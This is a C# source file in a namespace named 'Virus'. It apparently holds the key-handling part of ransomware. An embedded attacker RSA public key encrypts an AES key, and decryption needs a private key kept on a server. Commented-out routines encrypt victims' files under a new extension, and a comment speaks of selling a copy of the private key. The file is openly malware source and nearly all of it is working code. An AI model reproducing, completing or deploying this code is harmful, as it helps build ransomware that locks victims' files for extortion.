using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Web;

namespace Virus
{
    class RSAencryption
    {
        //TODO Remove  && !f.Contains(".ignore") from this document.
        private static string _publicKey = "<RSAKeyValue><Modulus>sL6H9+sJ+ZeQLZX1b5d107lRFHrS0jWdXs9M2En/IilG9xTWHJstuPt13aq9QgDB/2tdi7SYLIIfqD5trNgViEK3/+45g71KQ1NZaiUaVVTweFINBkBqBlycCpPeQi0QljK1cLNunSWHF9zuU//RkUMC3jR4RIw1BR1Zo2qu/lFC9ektctXpGePZk2BEQ8xHg0oTgFF5MH8se8eM85Jc1rsHuxAwiTcjQ5ekBH14rgDtZiXTwDclAMXWM1sz9H2o7yRuBhdpaN4YL0tvGyEAuMcPulDA2QF7OhjIOG7q02VBQVGGXYxk9WukJ10Zg0/O17oEcal2nkLoA5lslUVXuQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
        private static UnicodeEncoding _encoder = new UnicodeEncoding();

        public static string Encrypt(string textToEncrypt)
        {
            var bytesToEncrypt = Encoding.UTF8.GetBytes(textToEncrypt);

            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                try
                {
                    rsa.FromXmlString(_publicKey.ToString());
                    var encryptedData = rsa.Encrypt(bytesToEncrypt, true);
                    var base64Encrypted = Convert.ToBase64String(encryptedData);
                    return base64Encrypted;
                }
                finally
                {
                    rsa.PersistKeyInCsp = false;
                }
            }
        }//Used to encrypt AES key
        public static string Decrypt(string textToDecrypt, string privateKeyString)
        {
            var bytesToDescrypt = Encoding.UTF8.GetBytes(textToDecrypt);

            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                try
                {
                    // server decrypting data with private key
                    rsa.FromXmlString(privateKeyString);

                    var resultBytes = Convert.FromBase64String(textToDecrypt);
                    var decryptedBytes = rsa.Decrypt(resultBytes, true);
                    var decryptedData = Encoding.UTF8.GetString(decryptedBytes);
                    return decryptedData.ToString();
                }
                finally
                {
                    rsa.PersistKeyInCsp = false;
                }
            }
        }//Used to decrypt AES key

        #region commented (Not using)
        //private static byte[] DecryptBytes(byte[] bytesToDecrypt, string privkey)
        //{
        //    var rsa = new RSACryptoServiceProvider();
        //    rsa.FromXmlString(privkey); //pass in privkey and sell copy of _privateKey
        //    var decryptedByte = rsa.Decrypt(bytesToDecrypt, false);
        //    return decryptedByte;
        //}
        //private static void DecryptFile(string encryptedFilePath, string privkey)
        //{
        //    byte[] encryptedBytes = File.ReadAllBytes(encryptedFilePath);
        //    byte[] decryptedBytes = DecryptBytes(encryptedBytes, privkey);
        //    string newPath = encryptedFilePath.Replace("_encryptedExtension", "");
        //    File.WriteAllBytes(newPath, decryptedBytes);
        //}


        //private static byte[] EncryptBytes(byte[] bytesToEncrypt, string pubkey)
        //{
        //    var rsa = new RSACryptoServiceProvider();
        //    rsa.FromXmlString(pubkey);
        //    var encryptedByteArray = rsa.Encrypt(bytesToEncrypt, false).ToArray();

        //    return encryptedByteArray;
        //}
        //private static bool EncryptFile(string toBeEncryptedFullPath, string pubkey)
        //{
        //    byte[] rawBytes = File.ReadAllBytes(toBeEncryptedFullPath);
        //    byte[] encryptedBytes = EncryptBytes(rawBytes, pubkey);
        //    string newPath = toBeEncryptedFullPath + "_encryptedExtension";   // Path.ChangeExtension(toBeEncryptedFullPath, ".encrypt");
        //    File.WriteAllBytes(newPath, encryptedBytes);
        //    return true;

        //}
        #endregion
    }
}
